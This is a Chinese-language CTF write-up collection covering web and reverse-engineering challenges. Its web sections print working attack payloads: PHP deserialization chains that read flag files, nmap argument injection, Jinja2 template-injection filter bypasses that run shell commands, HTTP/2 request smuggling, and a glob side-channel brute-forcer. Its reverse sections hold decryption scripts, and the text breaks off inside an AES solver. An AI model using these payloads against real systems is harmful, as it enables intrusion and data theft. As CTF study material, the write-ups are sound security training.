/havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF 得到图片，信息是 key=9： 最后再来一次反序列化链调用： 12345Me:__wakeup() （引用）her:__invoke()important:__sleep()useless:__get()her:find() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass Me &#123; public $qwe; public $bro; public $secret; public function __construct()&#123; $this-&gt;qwe = new her; $this-&gt;bro = &amp;$this-&gt;secret; &#125;&#125;class her&#123; private $hername; private $key; public $asd; public function __construct()&#123; $this-&gt;asd = new important; &#125;&#125;class important&#123; public $power; public function __construct()&#123; $this-&gt;power = new useless; &#125;&#125;class useless &#123; private $seeyou; public $QW; public $YXX; public function __construct() &#123; $this-&gt;seeyou = array(&#x27;seeyou&#x27;=&gt;array(new hez,&#x27;find&#x27;)); &#125;&#125;class hez&#123; private $hername; private $key; public $asd; public function __construct()&#123; $this-&gt;hername = &#x27;momo&#x27;; $this-&gt;key = &#x27;9&#x27;; &#125;&#125;$a=new Me;echo urlencode(serialize($a)); phpinfo()，修改引用11为13： C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125; 修改引用16为18，改hez为her： C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125; 最终payload，列目录： ?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f* POST: ctf=DirectoryIterator 得到flag文件名为 flag_my_baby.php。 再读flag文件： ?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php POST: ctf=SplFileObject 结果base64解码即得flag。 ​ scan_tool nmap也太好用了！不是吧，你还不会用吗？ 过滤了 ? php flag iL oN 参考：[网鼎杯 2020 朱雀组]Nmap 使用nmap读文件，选项 -oA，该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。 使用 ?ip=127.0.0.1&#39; -i /fl&quot;&quot;ag -oA 1 &#39;，再访问 1.nmap 得到flag。 ​ klf_2 ”可恶，我不信，我绝对不是klf，你们才是，哈哈这次我卷土重来了，你们肯定是klf，我要向女神证明自己…“ robots.txt 得路由 /secr3ttt，测试过滤关键字有： [ ] _ &#39; &quot; \\ config init globals os import request open read 0 137 pop 列目录： 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4７)%&#125;&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; 得到flag文件名 fl4gfl4gfl4g，再读flag文件： 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4７)%&#125;&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; ​ EZ_Smuggling 这是一个简单的H2转H1的小网站，站长认为他很安全，没有人能在他的网站走私任何东西。 题目链接:https://47.108.56.168:20231/ 备用链接1:https://47.108.56.168:20232/ 备用链接2:https://47.108.56.168:20233/ H2.CL请求走私，参考： HTTP Request Smuggling – HTTP/2 Downgrade Attack Part 2 构造： 123456789GET / HTTP/2Host: 47.108.56.168:20231Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=Content-Length: 0GET /admin HTTP/1.1Host: 47.108.56.168:20231Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=Content-Length: 0 即可得flag：SYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;。 ​ klf_3 ”好好好这都给你们做出来了，这次我拜托了pursue0h帮我收集了你们前几次的payload，这次绝对不可能让你们做出来，你们绝对是klf“ robots.txt 得到路由 /secr3ttt，同klf_2相同打法即可。 列目录： 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4７)%&#125;&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; 得到flag文件名 fl4gfl4gfl4g，再读flag文件： 123456789101112131415&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set so=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set sp=char(32)%&#125;&#123;% set d=char(4７)%&#125;&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;&#123;%print(f)%&#125; ​ Akane! 最适合梅菲斯特的一题 glob协议侧信道爆破文件名。 12345678910111213141516from phpserialize import serializeimport base64class Idol: public_Akane=&#x27;glob:///etc/passss&#x27; class Hoshino: public_Ruby=Idol()res = res.replace(b&#x27;&quot;Hoshino&quot;:1&#x27;,b&#x27;&quot;Hoshino&quot;:2&#x27;)print(res)print(base64.b64encode(res))# O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;# 绕wakeup# O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125; 12345678910111213141516171819202122import requestsimport stringimport base64url = &#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;filename = &#x27;/var/www/html/The************************.php&#x27;dic = string.printablename = &#x27;&#x27;for i in range(24): for j in dic: guess = f&#x27;glob:///var/www/html/The&#123;name+j&#125;&#123;&quot;*&quot;*(23-len(name))&#125;.php&#x27; payload = f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:&#123;len(guess)&#125;:&quot;&#123;guess&#125;&quot;;&#125;&#125;&#125;&#125;&#x27;.encode() r = requests.get(f&#x27;&#123;url&#125;&#123;base64.b64encode(payload).decode()&#125;&#x27;) if &#x27;Kurokawa Akane&#x27; in r.text: name += j print(name) breakprint(name)# S4crEtF1AgFi1EByo2takuXX 再访问 /var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php 即可得flag。 ​ REshiftjmp 跳到哪里去了？ 用IDA解析程序崩溃，改用Ghidra解析： 123456789101112131415161718192021undefined8 main(void)&#123; uint uVar1; uint uStack12; puts(&quot;flag:&quot;); uStack12 = 0; while( true ) &#123; if (0x21 &lt; (int)uStack12) &#123; puts(&quot;yes&quot;); return 0; &#125; uVar1 = func_0x00101070(); if ((uVar1 ^ uStack12) != (int)(char)rodata[uStack12]) break; uStack12 = uStack12 + 1; &#125; puts(&quot;no&quot;); return 0; &#125; 逻辑为简单异或操作，还原： 12345rodata = list(bytes.fromhex(&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;))flag = [rodata[i]^i for i in range(41)]print(bytes(flag))# b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27; ​ 点击就送的逆向题 代码如何到可执行二进制文件?(记得将得到的正确字符串包裹上SYC{}!!!!!!!) 将s文件编译：gcc xxx.s -o xxx 关键代码： 123456789v7 = __readfsqword(0x28u);strcpy(s2, &quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;);__isoc99_scanf(&amp;unk_2004, s1);for ( i = 0; i &lt;= 31; ++i ) s1[i] += 7;if ( !strcmp(s1, s2) ) printf(&quot;wrong!&quot;);puts(&quot;good!&quot;);return 0; 逻辑为ROT7，cyberchef还原为 SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF。 flag：SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125; ​ easymath 别担心，没学过线性代数也可以做出来，听说z3老师很厉害。flag请使用SYC{}包裹。 前部分代码为 $\\mathbb{Z}_{32}$ 下矩阵乘法：$L \\cdot M = I$ 后部分代码，根据代码测试代码逻辑： 12345678flag = &#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;table = &#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;pos = [table.index(flag[i])+48 for i in range(len(flag))]print(pos)print(bytes(pos))num = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 19, 22, 26, 27, 28, 29, 31, 32, 50, 51, 52, 53, 54, 55, 56]last = [num[k-48] for k in pos]print(last) 逻辑为将flag按照num来编序号。 还原脚本： 1234567891011M = matrix(Zmod(32), [[18, 29, 16, 19, 27], [8, 31, 8, 23, 30], [29, 3, 28, 10, 21], [18, 29, 8, 16, 28], [11, 30, 7, 20, 7]])I = identity_matrix(Zmod(32), 5)L = I*M^-1m = L.list()num = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 19, 22, 26, 27, 28, 29, 31, 32, 50, 51, 52, 53, 54, 55, 56]table = &#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;flag = [table[num.index(m[i])] for i in range(25)]print(&#x27;&#x27;.join(flag))# xtd4co_ymiunbbx3Aypsmbzii flag：SYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125; ​ 幸运数字 试试今天的运势 按逻辑还原： 123456789101112131415data = [13, 7, 29, 37, 29, 110, 48, 57, 44, 63, 42, 43, 50, 63, 42, 55, 110, 48, 48, 48, 48, 45, 1, 7, 49, 43, 1, 57, 31, 59, 45, 45, 27, 58, 1, 12, 111, 57, 54, 42, 35]def cal(k): return k*(k+1)//2for k in range(1000): x = [data[i]^(cal(k)%0xd3) for i in range(41)] if x[-1] == 125: print(k, bytes(x)) # b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27; ​ 听说cpp很难？ xxx师傅偶然听到有人说cpp很难，真的很难吗？不会吧，不会吧。于是，X师傅连忙出了一道给大伙儿涨涨信心。 动调，得到逻辑为 $[(9+1) \\oplus (f_i+10)]-9-1$。 爆破还原： 1234567891011121314c = [77, 95, 61, -123, 55, 104, 115, 87, 39, 104, 81, 89, 127, 38, 107, 89, 115, 87, 85, 91, 89, 111, 106, 89, 39, 87, 114, 87, 79, 87, 120, 120, -125]def cal(x): return ((9+1)^(x+10))-9-1f=[]for i in range(len(c)): for j in range(256): if cal(j) == c[i]: f.append(j)print(bytes(f))# b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27; flag：SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125; ​ 砍树 你会安卓吗?我反正不会 jadx查看apk，用IDA在so文件中查看主要逻辑： 12345678910111213141516171819202122232425262728_BOOL8 __fastcall Java_com_sky_ezreeeee_MainActivity_I0o0I(__int64 a1, __int64 a2, __int64 a3, __int64 a4)&#123; int i; // [rsp+Ch] [rbp-64h] __int64 v6; // [rsp+10h] [rbp-60h] _BOOL4 v7; // [rsp+1Ch] [rbp-54h] unsigned __int8 *v9; // [rsp+20h] [rbp-50h] unsigned __int8 *v10; // [rsp+28h] [rbp-48h] char dest[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); v10 = (unsigned __int8 *)jstring_2unsigchar(a1, a3); v9 = (unsigned __int8 *)jstring_2unsigchar(a1, a4); v6 = A0OWO0A(v10, v9); memcpy(dest, &amp;unk_14900, 0x23uLL); for ( i = 0; i &lt; 34; ++i ) v7 = *(unsigned __int8 *)(v6 + i) == (unsigned __int8)dest[i]; return v7;&#125;unsigned __int8 *__fastcall A0OWO0A(unsigned __int8 *a1, const unsigned __int8 *a2)&#123; int i; // [rsp+4h] [rbp-14h] for ( i = 0; i &lt; 34; ++i ) a1[i] ^= a2[i % 7]; return a1;&#125; 简单异或运算，提取密文：002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218，密钥：Syclove，Cyberchef异或操作得 SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;。 ​ flower-or-tea Flower ?or tea? or flower tea? 去除jmp花指令，全局替换 74 03 75 01 XX 为 90 90 90 90 90 (NOP)。 看伪码为魔改XTEA算法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import *c = [75, 70, 249, 154, 158, 184, 23, 196, 19, 167, 23, 178, 232, 169, 59, 201, 78, 228, 243, 148, 181, 42, 204, 181, 44, 228, 81, 68, 154, 40, 138, 122, 8, 208, 200, 83, 73, 123, 17, 110, 148, 215, 255, 155, 249, 45, 255, 94, 49, 37, 231, 23, 121, 153, 189, 223, 58, 27, 135, 143, 172, 197, 232, 115, 166, 112, 134, 178, 105, 163, 246, 90, 36, 218, 247, 44, 175, 102, 123, 52, 96, 77, 200, 185, 47, 145, 30, 145, 155, 47, 90, 189, 58, 115, 150, 203, 190, 104, 153, 197, 233, 19, 0, 160, 164, 78, 47, 193, 16, 58, 134, 222, 148, 213, 196, 160, 60, 152, 128, 67, 72, 118, 47, 126, 137, 220, 77, 229, 144, 166, 39, 63, 153, 49, 141, 181, 23, 229, 74, 96, 132, 57, 144, 156, 129, 68, 224, 244, 255, 237, 244, 60]c = [bytes_to_long(bytes(c[4*i:4*i+4])[::-1]) for i in range(len(c)//4)]print(c)k = [32,27,39,44]rounds = 54delta = 0x31415927def decrypt(v): v0 = v[0] v1 = v[1] x = delta * rounds for i in range(rounds): x -= delta x = x &amp; 0xFFFFFFFF v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[x &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) ^ x v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vfl = b&#x27;&#x27;fr = b&#x27;&#x27;for i in range(len(c)//2): cc = c[2*i:2*i+2][::-1] m = decrypt(cc) fr = long_to_bytes(m[0])[::-1] + fr fl += long_to_bytes(m[1])[::-1]print(fl)print(fr)print(fl+fr)# b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27; ​ mySelf Why so serious? 动调，得到第二个对输入的加密逻辑为TEA算法。 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *c = [240, 249, 189, 189, 196, 148, 97, 226, 37, 145, 121, 128, 25, 194, 15, 31, 21, 24, 106, 235, 197, 114, 245, 132, 133, 58, 204, 64, 187, 42, 163, 210]c = [bytes_to_long(bytes(c[4*i:4*i+4])[::-1]) for i in range(len(c)//4)]print(c)k = [2,2,3,4]def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vflag = b&#x27;&#x27;for i in range(len(c)//2): cc = c[2*i:2*i+2] m = decrypt(cc,k) flag += long_to_bytes(m[0])[::-1] flag += long_to_bytes(m[1])[::-1]print(flag)# b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27; ​ rainbow 美丽的IDA控制流视图 like Rainbow! LLVM去平坦化： python3 deflat.py -f ./rainbow --addr 0x401160 再简单逆回去： 12345678910111213141516from Crypto.Util.number import *c = [0x627B44508E415865,0x847D6C49547E4A57,0x4877646060955B4F,0x622D3C689F7B4D7D]cc = []for k in c: cc += list(long_to_bytes(k)[::-1])for i in range(len(cc)): cc[i] ^= i if i%3 == 0: cc[i] -= 18print(bytes(cc))# SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125; ​ 小黄鸭 小黄鸭的钥匙被一个叫毗外的大坏鸭偷走了,你能帮它找到钥匙吗? python反编译，得到1.pyc，修复为3.7的文件头 550d0d0a，还原python代码。 密文：~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH Cyberchef解：ROT93+Reverse+ROT12 得到：SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125; 修正一下得flag：SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125; ​ 寻找初音未来 正确的输入即可解救Miku~(图有点大了忍一下) Go程序，代码逻辑为RC4，动调得 key=&#39;C&#39;*18。 输入问题 初音未来色是多少?(输入为16进制,如0x123abc则输入123abc) 答案 39C5BB，提取密文，RC4解密： 12345678910111213141516171819202122232425262728293031N = 256S = [0] * Nkey = &#x27;C&#x27;*18Key = [0] * Nt = [ 0x25, 0x6F, 0x3D, 0x6C, 0xF9, 0xE0, 0xCF, 0x3F, 0x2E, 0x24, 0xC6, 0x7B, 0x81, 0xBF, 0x55, 0x4F, 0x0D, 0x99, 0x87, 0x47, 0x48, 0xF7, 0xB9, 0x98, 0xFB, 0x1B, 0x22, 0xEC, 0x84, 0x23, 0xFD, 0xB2]for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)print(&#x27;&#x27;.join(chr(k) for k in t))# SYC&#123;N0thing_1s_sEriOus_But_MIku&#125; ​ 浪漫至死不渝 某师傅想给他的女神表白，他写了一个网站，点爱心之后就能输入密码，但是在写的过程中他不小心把提示的密码删除了，你能帮他找出表白密码吗？(输入密码时，记得刷新喔） ps:请将密码包裹SYC{}上交，且将字母全改为大写 js文件加密逻辑分析。 key为Text1，采用了栅栏密码加密得到 53X211WH04N，利用现有的 decryptRailFence() 函数解密： decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39; 密文为：125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99 加密逻辑为： 12i&lt;14 时：c[i]=(m[i]^k[i%7])+10i&gt;=14 时：c[i]=(m[i]^k[i-7])+99 还原明文代码： 12345678910111213c = [125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99]k = list(b&#x27;5201314WXHN&#x27;)m = []for i in range(18): if i &lt; 14: m.append((c[i]-10)^k[i%7]) else: m.append((c[i]-99)^k[i-7])print(bytes(m))# b&#x27;FJIAXUEFJIAXUEWXHN&#x27; flag：SYC&#123;FJIAXUEFJIAXUEWXHN&#125; ​ AES! AES? What’s this ? 照逻辑尝试逆向即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174import mathv17 = [224, -251, -146, -62, -146, -103, -152, 69, -131, -225, -193, -7, -105, -138, 59, 146, 47, -188, -250, -153, -88, -21, -20, 74, -145, -24, -203, -7, -84, -89, 140, 113]c = [k&amp;0xff for k in v17]v16 = [110, 121, 105, 131, 121, 127, 105, 117, 121, 120, 129, 105, 93, 99, 77, 73]v13 = [122, 118, 107, 109, 111, 42, 115, 120, 121, 127, 126, 42, 131, 121, 127, 124, 42, 112, 118, 107, 113, 68, 42, 20]v14 = v15 = 0v10 = [131, 111, 125, 43, 42, 131, 121, 127, 42, 107, 124, 111, 42, 124, 115, 113, 114, 126, 43, 20, 10, 120, 121, 136, 126, 124, 131, 42, 107, 113, 107, 115, 120, 136, 20, 10, 120, 121, 136, 10]S = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 